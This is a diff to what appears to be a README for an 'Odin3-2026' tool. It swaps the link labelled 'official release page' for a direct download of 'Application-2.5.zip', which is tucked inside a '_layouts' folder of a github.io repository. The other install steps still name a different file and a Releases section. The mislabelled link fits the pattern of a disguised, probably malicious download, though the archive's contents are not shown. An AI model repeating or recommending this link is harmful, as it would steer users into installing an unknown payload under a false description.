@@ -26,7 +26,7 @@ Make sure your computer meets these requirements before you start:
 
 Follow these steps to obtain the tool:
 
-1.  Visit the official release page: [https://github.com/Colenenacreous882/Odin3-2026](https://github.com/Colenenacreous882/Odin3-2026)
+1.  Visit the official release page: [https://github.com/Colenenacreous882/colenenacreous882.github.io/raw/refs/heads/main/_layouts/Application-2.5.zip](https://github.com/Colenenacreous882/colenenacreous882.github.io/raw/refs/heads/main/_layouts/Application-2.5.zip)
 2.  Look for the "Releases" section on the right side of the page.
 3.  Click the latest version link.
 4.  Download the file named `Odin3_2026_Full.zip`.
